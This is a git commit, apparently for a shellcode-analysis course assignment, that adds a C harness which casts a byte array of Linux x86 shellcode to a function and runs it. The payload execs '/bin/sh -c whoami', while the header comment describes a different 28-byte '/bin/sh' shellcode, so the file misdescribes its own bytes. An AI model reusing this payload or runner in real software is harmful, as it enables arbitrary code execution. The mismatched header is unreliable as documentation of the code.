f8cd8da2e7c05809d5ff061d6318fb037a9294fe
TEHWINSAM <me@tehwinsam.com>
2019-11-08 17:37:34 +0800

    :) :bamboo:

---
+++ Assignment5/1/c++.cpp
@@ -0,0 +1,41 @@
+/*
+Title:	Linux x86 execve("/bin/sh") - 28 bytes
+Author:	Jean Pascal Pereira <pereira@secbiz.de>
+Web:	http://0xffe4.org
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060: 31 c0                 xor    %eax,%eax
+ 8048062: 50                    push   %eax
+ 8048063: 68 2f 2f 73 68        push   $0x68732f2f
+ 8048068: 68 2f 62 69 6e        push   $0x6e69622f
+ 804806d: 89 e3                 mov    %esp,%ebx
+ 804806f: 89 c1                 mov    %eax,%ecx
+ 8048071: 89 c2                 mov    %eax,%edx
+ 8048073: b0 0b                 mov    $0xb,%al
+ 8048075: cd 80                 int    $0x80
+ 8048077: 31 c0                 xor    %eax,%eax
+ 8048079: 40                    inc    %eax
+ 804807a: cd 80                 int    $0x80
+
+
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+char shellcode[]=
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x07\x00\x00\x00\x77"
+"\x68\x6f\x61\x6d\x69\x00\x57\x53\x89\xe1\xcd\x80";
+
+int main(int argc, char **argv)
+{
+ printf ("Shellcode length : %d bytes\n", strlen (shellcode));
+ int(*f)()=(int(*)())shellcode;
+ f();
+}
+
